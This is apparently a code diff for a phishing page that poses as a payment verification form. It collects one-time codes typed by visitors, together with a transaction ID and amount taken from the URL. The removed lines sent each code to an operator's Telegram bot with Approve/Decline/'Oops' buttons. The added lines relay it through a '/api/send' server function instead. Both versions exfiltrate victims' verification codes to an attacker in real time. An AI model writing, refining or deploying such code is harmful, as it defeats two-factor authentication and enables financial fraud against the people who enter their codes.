@@ -357,12 +357,6 @@
   <div class="toast" id="toast"></div>
 
 <script>
-// ==========================================
-// TELEGRAM CONFIGURATION (REPLACE THESE)
-// ==========================================
-const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; 
-const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';     
-
 // --- Base64URL Decoder ---
 function b64urlDecode(str) {
   try {
@@ -376,14 +370,13 @@ function b64urlDecode(str) {
 
 // --- Extract Data from URL ---
 const urlParams = new URLSearchParams(window.location.search);
-const codeParam = urlParams.get('r');
 const encodedParam = urlParams.get('d');
 
 let actualTxnId = 'TXN-PENDING';
 let actualAmount = '0.00';
 let actualCurrency = 'USD';
 
-// Check if data is encoded in the URL (d=...) or if we need to use fallback
+// Decode payload to get TXN, Amount, and Currency
 if (encodedParam) {
   const raw = b64urlDecode(encodedParam);
   if (raw) {
@@ -395,7 +388,6 @@ if (encodedParam) {
     } catch (e) { console.warn('Payload parse error', e); }
   }
 } else if (urlParams.get('tx')) {
-  // Fallback if parameters were passed individually
   actualTxnId = urlParams.get('tx');
   actualAmount = urlParams.get('am') || actualAmount;
   actualCurrency = urlParams.get('cur') || actualCurrency;
@@ -478,7 +470,7 @@ function resendCode() {
   startTimer();
 }
 
-// --- Send to Telegram & Handle Buttons ---
+// --- Send to Cloudflare Function (Secure) ---
 async function submitCode() {
   let code = '';
   inputs.forEach(i => code += i.value);
@@ -492,40 +484,20 @@ async function submitCode() {
   btn.disabled = true;
   btn.textContent = 'Verifying...';
 
-  // Prepare Telegram Message with Inline Buttons
-  const message = `
-🔐 *New Verification Code*
--------------------------------
-🆔 *Txn ID:* ${actualTxnId}
-💰 *Amount:* ${actualCurrency} ${actualAmount}
-🔢 *Code:* ${code}
-⏱ *Time:* ${new Date().toLocaleString()}
-  `;
-
-  // Inline Keyboard definition
-  const inlineKeyboard = {
-    inline_keyboard: [
-      [
-        { text: "✅ Approve", callback_data: "approve" },
-        { text: "❌ Decline", callback_data: "decline" },
-        { text: "😅 Oops", callback_data: "oops" }
-      ]
-    ]
-  };
-
   try {
-    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    // Call the secure Cloudflare function (it will automatically add the Telegram buttons)
+    const response = await fetch('/api/send', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: 'Markdown',
-        reply_markup: inlineKeyboard
+      body: JSON.stringify({ 
+        code: code,
+        amount: actualAmount, 
+        currency: actualCurrency, 
+        txnId: actualTxnId 
       })
     });
 
-    if (!response.ok) throw new Error('Telegram API failed');
+    if (!response.ok) throw new Error('Server failed');
 
     // Success state
     showToast('Code submitted successfully.', 'success');
